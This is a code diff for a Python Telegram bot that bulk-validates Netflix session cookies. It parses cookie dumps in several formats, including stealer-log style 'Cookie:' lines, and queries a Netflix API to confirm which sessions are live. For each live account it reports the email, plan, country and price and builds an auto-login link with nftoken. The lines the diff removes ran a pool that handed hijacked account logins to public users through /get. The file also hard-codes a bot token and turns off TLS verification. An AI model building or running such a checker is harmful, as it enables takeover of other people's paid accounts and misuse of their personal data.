@@ -7,7 +7,6 @@ import re
 import urllib.parse
 import zipfile
 from datetime import datetime, timezone
-from collections import deque
 
 import httpx
 import requests
@@ -26,12 +25,6 @@ from urllib3.exceptions import InsecureRequestWarning
 BOT_TOKEN      = os.environ.get("BOT_TOKEN", "9221013683:AAGKJGFCsHU6WQhQYgznjNWxxb6u1AvR46Y")
 MAX_CONCURRENT = 10
 MAX_COOKIES    = 5000
-RECHECK_EVERY  = 3600  # re-validate pool every N seconds (1 hour)
-
-# Comma-separated Telegram user IDs that have admin access
-# e.g. ADMIN_IDS=123456789,987654321
-_raw_admins    = os.environ.get("8560543587", "")
-ADMIN_IDS: set[int] = {int(x.strip()) for x in _raw_admins.split(",") if x.strip().isdigit()}
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 
@@ -98,24 +91,6 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 log = logging.getLogger(__name__)
 
-# ── Account pool (in-memory) ───────────────────────────────────────────────────
-# Each entry: full result dict from check_one, plus "cookie_dict" for recheck
-_pool_lock = asyncio.Lock()
-_pool: list[dict] = []          # all known accounts
-_pool_index = 0                 # round-robin cursor for /get
-
-# ── Admin guard ────────────────────────────────────────────────────────────────
-
-def is_admin(update: Update) -> bool:
-    return update.effective_user.id in ADMIN_IDS
-
-async def admin_only(update: Update) -> bool:
-    """Returns True if user is admin. Sends denial and returns False otherwise."""
-    if is_admin(update):
-        return True
-    await update.message.reply_text("⛔ Unauthorized.")
-    return False
-
 # ── Helpers ────────────────────────────────────────────────────────────────────
 
 def format_expiry(ts) -> str:
@@ -133,7 +108,7 @@ def token_validity_label(expires) -> str:
     delta = int(expires) - int(datetime.now(timezone.utc).timestamp())
     if delta <= 0:
         return "Expired"
-    days, rem  = divmod(delta, 86400)
+    days, rem = divmod(delta, 86400)
     hours, rem = divmod(rem, 3600)
     minutes    = rem // 60
     if days > 0:
@@ -169,6 +144,14 @@ def _parse_netscape_line(line: str) -> dict:
 
 
 def _extract_inline_cookie_string(line: str) -> str | None:
+    """
+    Handles lines like:
+      🍪 Cookie: NetflixId=abc; SecureNetflixId=xyz
+      Cookie: NetflixId=abc
+      NetflixId=abc; ...
+    Returns just the cookie string portion, or None.
+    """
+    # Strip emoji and label prefix: anything before "NetflixId=" or "Cookie:"
     m = re.search(r'(?:Cookie:\s*)?(NetflixId=.+)', line, re.IGNORECASE)
     if m:
         return m.group(1).strip()
@@ -182,7 +165,11 @@ def extract_cookie_dict(text: str) -> dict:
         line = raw.strip()
         if not line or line.startswith("#"):
             continue
+
+        # Netscape tab-delimited
         out.update(_parse_netscape_line(line))
+
+        # Emoji/label prefixed cookie lines: "🍪 Cookie: NetflixId=..."
         cookie_str = _extract_inline_cookie_string(line)
         if cookie_str:
             for key in COOKIE_KEYS:
@@ -192,6 +179,7 @@ def extract_cookie_dict(text: str) -> dict:
                 if m:
                     out[key] = _decode_value(m.group(1))
 
+    # JSON formats
     try:
         data = json.loads(text)
     except json.JSONDecodeError:
@@ -214,6 +202,7 @@ def extract_cookie_dict(text: str) -> dict:
                 if n in COOKIE_KEYS and isinstance(v, str):
                     out[n] = _decode_value(v)
 
+    # Fallback plain regex
     for key in COOKIE_KEYS:
         if key in out:
             continue
@@ -225,10 +214,19 @@ def extract_cookie_dict(text: str) -> dict:
 
 
 def _split_cookie_blocks(text: str) -> list[str]:
+    """
+    Split bulk text into per-account blocks.
+    Handles:
+      - Emoji report format (blocks separated by 📁 Source: or ---)
+      - Blank-line separated blocks
+      - One entry per line
+      - JSON array formats
+    """
     text = text.strip()
     if not text:
         return []
 
+    # JSON
     try:
         data = json.loads(text)
     except json.JSONDecodeError:
@@ -246,15 +244,19 @@ def _split_cookie_blocks(text: str) -> list[str]:
                     blocks.append(json.dumps([item]))
         return blocks
 
+    # Emoji report format — split on the separator line "---" or "📁 Source:"
     if "📁 Source:" in text or "\r\n---\r\n" in text or "\n---\n" in text:
+        # Split on the source header line to get per-account chunks
         chunks = re.split(r'(?=📁 Source:)', text)
         if len(chunks) > 1:
             return [c.strip() for c in chunks if c.strip() and "NetflixId" in c]
 
+    # Blank-line delimited
     sections = re.split(r"\n{2,}", text)
     if len(sections) > 1:
         return [s.strip() for s in sections if s.strip()]
 
+    # One entry per line
     return [line.strip() for line in text.splitlines() if line.strip()]
 
 
@@ -315,6 +317,7 @@ async def fetch_token(nid: str, client: httpx.AsyncClient) -> tuple[str, int | N
 
     if not token:
         raise ValueError("no token in response")
+
     if isinstance(expires, int) and len(str(expires)) == 13:
         expires //= 1000
 
@@ -368,7 +371,6 @@ async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.S
                 "token":          token,
                 "expires":        expires,
                 "expiring_today": is_expiring_today(expires),
-                "cookie_dict":    cookie_dict,
                 **account,
                 "error":          None,
             }
@@ -377,7 +379,7 @@ async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.S
             status = "dead" if code in (401, 403) else "error"
             return {
                 "status": status, "netflix_id": nid, "token": None,
-                "expires": None, "expiring_today": False, "cookie_dict": cookie_dict,
+                "expires": None, "expiring_today": False,
                 "email": "N/A", "membership": "N/A", "country": "N/A",
                 "member_since": "N/A", "num_profiles": "N/A",
                 "can_stream": "N/A", "max_streams": "N/A",
@@ -386,84 +388,19 @@ async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.S
         except Exception as e:
             return {
                 "status": "error", "netflix_id": nid, "token": None,
-                "expires": None, "expiring_today": False, "cookie_dict": cookie_dict,
+                "expires": None, "expiring_today": False,
                 "email": "N/A", "membership": "N/A", "country": "N/A",
                 "member_since": "N/A", "num_profiles": "N/A",
                 "can_stream": "N/A", "max_streams": "N/A",
                 "subscription_price": "N/A", "error": str(e)[:120],
             }
 
-# ── Pool management ────────────────────────────────────────────────────────────
-
-async def pool_add_results(results: list[dict]):
-    """Merge new check results into the pool, deduplicating by NetflixId."""
-    global _pool
-    async with _pool_lock:
-        existing = {r["netflix_id"] for r in _pool}
-        for r in results:
-            if r["netflix_id"] not in existing:
-                _pool.append(r)
-                existing.add(r["netflix_id"])
-            else:
-                # Update existing entry with fresh result
-                for i, entry in enumerate(_pool):
-                    if entry["netflix_id"] == r["netflix_id"]:
-                        _pool[i] = r
-                        break
-
-
-async def pool_recheck():
-    """Re-validate every account in the pool. Runs as a background task."""
-    global _pool
-    while True:
-        await asyncio.sleep(RECHECK_EVERY)
-        async with _pool_lock:
-            snapshot = list(_pool)
-
-        if not snapshot:
-            continue
-
-        log.info(f"Pool recheck: {len(snapshot)} accounts")
-        sem = asyncio.Semaphore(MAX_CONCURRENT)
-        async with httpx.AsyncClient(verify=False) as client:
-            tasks   = [check_one(r["cookie_dict"], client, sem) for r in snapshot]
-            updated = await asyncio.gather(*tasks)
-
-        async with _pool_lock:
-            nid_map = {r["netflix_id"]: r for r in updated}
-            _pool   = [nid_map.get(r["netflix_id"], r) for r in _pool]
-
-        live = sum(1 for r in updated if r["status"] == "live")
-        log.info(f"Pool recheck done: {live}/{len(updated)} live")
-
-
-def pool_live_accounts() -> list[dict]:
-    """Return live, non-expired accounts from the pool (no lock — read-only snapshot)."""
-    now = int(datetime.now(timezone.utc).timestamp())
-    return [
-        r for r in _pool
-        if r["status"] == "live"
-        and isinstance(r.get("expires"), (int, float))
-        and r["expires"] > now
-    ]
-
-
-def pool_next_account() -> dict | None:
-    """Round-robin pick from live pool."""
-    global _pool_index
-    live = pool_live_accounts()
-    if not live:
-        return None
-    account     = live[_pool_index % len(live)]
-    _pool_index = (_pool_index + 1) % max(len(live), 1)
-    return account
-
 # ── Formatters ─────────────────────────────────────────────────────────────────
 
 def account_card(r: dict, index: int | None = None) -> str:
     flag     = "⚠️ Expiring Today" if r["expiring_today"] else "✅ Active"
     validity = token_validity_label(r["expires"])
-    header   = "🎬 *Netflix Account*" + (f" #{index}" if index else "") + f" — {flag}"
+    header   = f"🎬 *Netflix Account*" + (f" #{index}" if index else "") + f" — {flag}"
     return "\n".join([
         header,
         "─" * 32,
@@ -570,154 +507,70 @@ class ProgressReporter:
 
 # ── Keyboards ──────────────────────────────────────────────────────────────────
 
-def public_menu_kb() -> InlineKeyboardMarkup:
+def main_menu_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("🎬 Get Account", callback_data="pub:get"),
-        InlineKeyboardButton("ℹ️ Help",        callback_data="pub:help"),
+        InlineKeyboardButton("ℹ️ Help",    callback_data="help"),
+        InlineKeyboardButton("📊 Status", callback_data="status"),
     ]])
 
 
-def admin_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("📤 Upload & Check", callback_data="adm:upload_hint"),
-            InlineKeyboardButton("🗂 Pool Stats",     callback_data="adm:pool"),
-        ],
-        [
-            InlineKeyboardButton("🔄 Recheck Now",   callback_data="adm:recheck"),
-            InlineKeyboardButton("🗑 Clear Pool",     callback_data="adm:clear"),
-        ],
-        [
-            InlineKeyboardButton("📥 Export Pool",   callback_data="adm:export"),
-            InlineKeyboardButton("👥 Admins",        callback_data="adm:admins"),
-        ],
-    ])
-
-
-def back_kb(target: str = "pub") -> InlineKeyboardMarkup:
+def back_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("🔙 Back", callback_data=f"{target}:back"),
+        InlineKeyboardButton("🔙 Menu", callback_data="menu"),
     ]])
 
-# ── Shared check-and-store helper ──────────────────────────────────────────────
-
-async def run_bulk_check(
-    cookies: list[dict],
-    status_msg,
-    reply_target,
-    store_in_pool: bool = False,
-) -> list[dict]:
-    sem      = asyncio.Semaphore(MAX_CONCURRENT)
-    reporter = ProgressReporter(status_msg, len(cookies))
-
-    async with httpx.AsyncClient(verify=False) as client:
-        tasks   = [check_one(cd, client, sem) for cd in cookies]
-        results = []
-        for coro in asyncio.as_completed(tasks):
-            r = await coro
-            results.append(r)
-            await reporter.tick(r)
-
-    results.sort(key=lambda r: (
-        {"live": 0, "dead": 1, "error": 2}[r["status"]],
-        1 if r.get("expiring_today") else 0,
-    ))
-
-    if store_in_pool:
-        await pool_add_results([r for r in results if r["status"] == "live"])
-
-    return results
-
-# ── Bot handlers — public ──────────────────────────────────────────────────────
+# ── Bot handlers ───────────────────────────────────────────────────────────────
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if is_admin(update):
-        await update.message.reply_text(
-            "🛡 *Admin Dashboard*\n\n"
-            "Upload a cookie file to check and store accounts in the pool.\n"
-            "Public users can generate login links from the pool via /get.",
+    await update.message.reply_text(
+        "🎬 *Netflix Cookie Checker*\n\n"
+        "Send a `.txt`, `.json`, or `.zip` cookie file to bulk check.\n"
+        "Or paste a single cookie string as text.\n\n"
+        "Supported formats:\n"
+        "• `NetflixId=abc; SecureNetflixId=xyz`\n"
+        "• Emoji report format (`🍪 Cookie: NetflixId=...`)\n"
+        "• Netscape tab-delimited\n"
+        "• JSON array `[{name, value}]`",
+        parse_mode="Markdown",
+        reply_markup=main_menu_kb(),
+    )
+
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+
+    if q.data == "menu":
+        await q.edit_message_text(
+            "🎬 *Netflix Cookie Checker*\n\nSend a file or paste a cookie.",
             parse_mode="Markdown",
-            reply_markup=admin_menu_kb(),
+            reply_markup=main_menu_kb(),
         )
-    else:
-        await update.message.reply_text(
-            "🎬 *Netflix Access*\n\n"
-            "Use /get to receive a login link for an active Netflix account.",
+    elif q.data == "help":
+        await q.edit_message_text(
+            "📖 *Help*\n\n"
+            "• Send `.txt` / `.json` / `.zip` for bulk checking\n"
+            "• Paste a single cookie string for one-off checks\n"
+            "• Emoji report files (`🍪 Cookie:` format) supported\n"
+            f"• Max {MAX_COOKIES} cookies per batch\n"
+            f"• {MAX_CONCURRENT} concurrent checks\n\n"
+            "Each live account shows:\n"
+            "email · membership · country · member since\n"
+            "profiles · streaming limits · sub price\n"
+            "token expiry · link validity · login URL",
             parse_mode="Markdown",
-            reply_markup=public_menu_kb(),
+            reply_markup=back_kb(),
+        )
+    elif q.data == "status":
+        await q.edit_message_text(
+            "⚙️ *Status*\n\n"
+            f"• Max cookies : `{MAX_COOKIES}`\n"
+            f"• Concurrency : `{MAX_CONCURRENT}`\n"
+            f"• UTC time    : `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}`",
+            parse_mode="Markdown",
+            reply_markup=back_kb(),
         )
 
-
-async def cmd_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    account = pool_next_account()
-    if not account:
-        await update.message.reply_text(
-            "😔 No active accounts available right now. Try again later."
-        )
-        return
-
-    login_url = f"https://netflix.com/?nftoken={account['token']}"
-    validity  = token_validity_label(account["expires"])
-
-    await update.message.reply_text(
-        f"🎬 *Netflix Account Ready*\n\n"
-        f"💳 Plan      : `{account['membership']}`\n"
-        f"🌍 Country   : `{account['country']}`\n"
-        f"⌛ Valid For : `{validity}`\n\n"
-        f"👉 [Login]({login_url})",
-        parse_mode="Markdown",
-        disable_web_page_preview=True,
-    )
-
-
-async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_only(update):
-        return
-    live  = len(pool_live_accounts())
-    total = len(_pool)
-    await update.message.reply_text(
-        f"🛡 *Admin Dashboard*\n\n"
-        f"Pool: `{live}` live / `{total}` total\n"
-        f"Recheck interval: every `{RECHECK_EVERY // 60}` min",
-        parse_mode="Markdown",
-        reply_markup=admin_menu_kb(),
-    )
-
-
-async def cmd_pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_only(update):
-        return
-    live     = pool_live_accounts()
-    total    = len(_pool)
-    expiring = [r for r in live if r["expiring_today"]]
-    safe     = [r for r in live if not r["expiring_today"]]
-    dead     = [r for r in _pool if r["status"] == "dead"]
-
-    await update.message.reply_text(
-        f"🗂 *Pool Status*\n\n"
-        f"Total stored     : `{total}`\n"
-        f"✅ Live safe      : `{len(safe)}`\n"
-        f"⚠️ Expiring today : `{len(expiring)}`\n"
-        f"❌ Dead           : `{len(dead)}`",
-        parse_mode="Markdown",
-        reply_markup=back_kb("adm"),
-    )
-
-
-async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_only(update):
-        return
-    global _pool, _pool_index
-    async with _pool_lock:
-        count       = len(_pool)
-        _pool       = []
-        _pool_index = 0
-    await update.message.reply_text(
-        f"🗑 Pool cleared. `{count}` entries removed.",
-        parse_mode="Markdown",
-    )
-
-# ── Bot handlers — document ────────────────────────────────────────────────────
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc      = update.message.document
@@ -734,16 +587,27 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(
             "❌ No valid cookies found.\n"
             "File must contain `NetflixId=` entries.",
+            reply_markup=main_menu_kb(),
         )
         return
 
-    store = is_admin(update)
-    label = "Admin upload" if store else "Check"
-    await status_msg.edit_text(
-        f"🔍 {label}: {len(cookies)} cookies found. Checking…"
-    )
+    await status_msg.edit_text(f"🔍 Found {len(cookies)} cookies. Checking…")
 
-    results = await run_bulk_check(cookies, status_msg, update.message, store_in_pool=store)
+    sem      = asyncio.Semaphore(MAX_CONCURRENT)
+    reporter = ProgressReporter(status_msg, len(cookies))
+
+    async with httpx.AsyncClient(verify=False) as client:
+        tasks   = [check_one(cd, client, sem) for cd in cookies]
+        results = []
+        for coro in asyncio.as_completed(tasks):
+            r = await coro
+            results.append(r)
+            await reporter.tick(r)
+
+    results.sort(key=lambda r: (
+        {"live": 0, "dead": 1, "error": 2}[r["status"]],
+        1 if r.get("expiring_today") else 0,
+    ))
 
     live          = [r for r in results if r["status"] == "live"]
     live_safe     = [r for r in live    if not r["expiring_today"]]
@@ -755,9 +619,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if first:
         await update.message.reply_text(account_card(first), parse_mode="Markdown")
 
-    pool_note = f"\n\n✅ `{len(live)}` accounts added to pool." if store else ""
     await status_msg.edit_text(
-        f"📊 *Done*{pool_note}\n\n"
+        f"📊 *Done*\n\n"
         f"Total          : `{len(results)}`\n"
         f"✅ Live         : `{len(live)}`\n"
         f"   ↳ Safe       : `{len(live_safe)}`\n"
@@ -765,7 +628,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"❌ Dead         : `{dead_count}`\n"
         f"⚠️ Error        : `{error_count}`",
         parse_mode="Markdown",
-        reply_markup=admin_menu_kb() if store else None,
     )
 
     out_buf      = io.BytesIO(build_output(results).encode("utf-8"))
@@ -786,6 +648,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not cd.get(REQUIRED_COOKIE):
         await update.message.reply_text(
             "No `NetflixId` found.\nTo check many at once, send a file.",
+            reply_markup=main_menu_kb(),
         )
         return
 
@@ -796,199 +659,22 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = await check_one(cd, client, sem)
 
     if result["status"] == "live":
-        if is_admin(update):
-            await pool_add_results([result])
         await msg.edit_text(account_card(result), parse_mode="Markdown")
     elif result["status"] == "dead":
         await msg.edit_text("❌ *Dead* — cookie invalid or expired.", parse_mode="Markdown")
     else:
         await msg.edit_text(f"⚠️ *Error* — `{result['error']}`", parse_mode="Markdown")
 
-# ── Callback handler ───────────────────────────────────────────────────────────
-
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q    = update.callback_query
-    data = q.data
-    await q.answer()
-
-    if data == "pub:get":
-        account = pool_next_account()
-        if not account:
-            await q.edit_message_text(
-                "😔 No active accounts available right now.",
-                reply_markup=public_menu_kb(),
-            )
-            return
-        login_url = f"https://netflix.com/?nftoken={account['token']}"
-        validity  = token_validity_label(account["expires"])
-        await q.edit_message_text(
-            f"🎬 *Netflix Account Ready*\n\n"
-            f"💳 Plan      : `{account['membership']}`\n"
-            f"🌍 Country   : `{account['country']}`\n"
-            f"⌛ Valid For : `{validity}`\n\n"
-            f"👉 [Login]({login_url})",
-            parse_mode="Markdown",
-            disable_web_page_preview=True,
-            reply_markup=public_menu_kb(),
-        )
-
-    elif data == "pub:help":
-        await q.edit_message_text(
-            "ℹ️ *Help*\n\n"
-            "• /get — receive a login link for an active Netflix account\n"
-            "• The link opens Netflix and logs you in directly\n"
-            "• Links expire after the shown validity time",
-            parse_mode="Markdown",
-            reply_markup=back_kb("pub"),
-        )
-
-    elif data == "pub:back":
-        await q.edit_message_text(
-            "🎬 *Netflix Access*\n\nUse /get to receive a login link.",
-            parse_mode="Markdown",
-            reply_markup=public_menu_kb(),
-        )
-
-    elif data == "adm:upload_hint":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        await q.edit_message_text(
-            "📤 *Upload Cookies*\n\n"
-            "Send a `.txt`, `.json`, or `.zip` file.\n"
-            "All live accounts will be automatically added to the pool.",
-            parse_mode="Markdown",
-            reply_markup=back_kb("adm"),
-        )
-
-    elif data == "adm:pool":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        live     = pool_live_accounts()
-        total    = len(_pool)
-        expiring = [r for r in live if r["expiring_today"]]
-        safe     = [r for r in live if not r["expiring_today"]]
-        dead     = [r for r in _pool if r["status"] == "dead"]
-        await q.edit_message_text(
-            f"🗂 *Pool Status*\n\n"
-            f"Total stored     : `{total}`\n"
-            f"✅ Live safe      : `{len(safe)}`\n"
-            f"⚠️ Expiring today : `{len(expiring)}`\n"
-            f"❌ Dead           : `{len(dead)}`\n\n"
-            f"Next recheck in  : `{RECHECK_EVERY // 60}` min",
-            parse_mode="Markdown",
-            reply_markup=back_kb("adm"),
-        )
-
-    elif data == "adm:recheck":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        async with _pool_lock:
-            snapshot = list(_pool)
-        if not snapshot:
-            await q.answer("Pool is empty.", show_alert=True)
-            return
-        await q.edit_message_text(
-            f"🔄 Rechecking `{len(snapshot)}` accounts…",
-            parse_mode="Markdown",
-        )
-        sem = asyncio.Semaphore(MAX_CONCURRENT)
-        async with httpx.AsyncClient(verify=False) as client:
-            tasks   = [check_one(r["cookie_dict"], client, sem) for r in snapshot]
-            updated = await asyncio.gather(*tasks)
-
-        async with _pool_lock:
-            nid_map  = {r["netflix_id"]: r for r in updated}
-            _pool[:] = [nid_map.get(r["netflix_id"], r) for r in _pool]
-
-        live = sum(1 for r in updated if r["status"] == "live")
-        await q.edit_message_text(
-            f"✅ *Recheck done*\n\n"
-            f"Live : `{live}` / `{len(updated)}`",
-            parse_mode="Markdown",
-            reply_markup=admin_menu_kb(),
-        )
-
-    elif data == "adm:clear":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        global _pool, _pool_index
-        async with _pool_lock:
-            count       = len(_pool)
-            _pool       = []
-            _pool_index = 0
-        await q.edit_message_text(
-            f"🗑 Pool cleared. `{count}` entries removed.",
-            parse_mode="Markdown",
-            reply_markup=admin_menu_kb(),
-        )
-
-    elif data == "adm:export":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        live = pool_live_accounts()
-        if not live:
-            await q.answer("No live accounts in pool.", show_alert=True)
-            return
-        out_buf      = io.BytesIO(build_output(live).encode("utf-8"))
-        out_buf.name = f"pool_export_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
-        await q.message.reply_document(
-            document=out_buf,
-            filename=out_buf.name,
-            caption=f"Pool export — {len(live)} live accounts.",
-        )
-        await q.edit_message_text(
-            f"📥 Exported `{len(live)}` live accounts.",
-            parse_mode="Markdown",
-            reply_markup=admin_menu_kb(),
-        )
-
-    elif data == "adm:admins":
-        if not is_admin(update):
-            await q.answer("⛔ Unauthorized", show_alert=True)
-            return
-        ids_str = "\n".join(f"• `{uid}`" for uid in sorted(ADMIN_IDS)) or "None configured"
-        await q.edit_message_text(
-            f"👥 *Authorized Admins*\n\n{ids_str}\n\n"
-            f"Add IDs via `ADMIN_IDS` env var (comma-separated).",
-            parse_mode="Markdown",
-            reply_markup=back_kb("adm"),
-        )
-
-    elif data == "adm:back":
-        if not is_admin(update):
-            return
-        live  = len(pool_live_accounts())
-        total = len(_pool)
-        await q.edit_message_text(
-            f"🛡 *Admin Dashboard*\n\n"
-            f"Pool: `{live}` live / `{total}` total",
-            parse_mode="Markdown",
-            reply_markup=admin_menu_kb(),
-        )
 
 # ── Entry point ────────────────────────────────────────────────────────────────
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    loop = asyncio.get_event_loop()
-    loop.create_task(pool_recheck())
-
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("get",   cmd_get))
-    app.add_handler(CommandHandler("admin", cmd_admin))
-    app.add_handler(CommandHandler("pool",  cmd_pool))
-    app.add_handler(CommandHandler("clear", cmd_clear))
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-
-    log.info(f"Bot running. Admins: {ADMIN_IDS}")
+    log.info("Bot running.")
     app.run_polling()
 
 
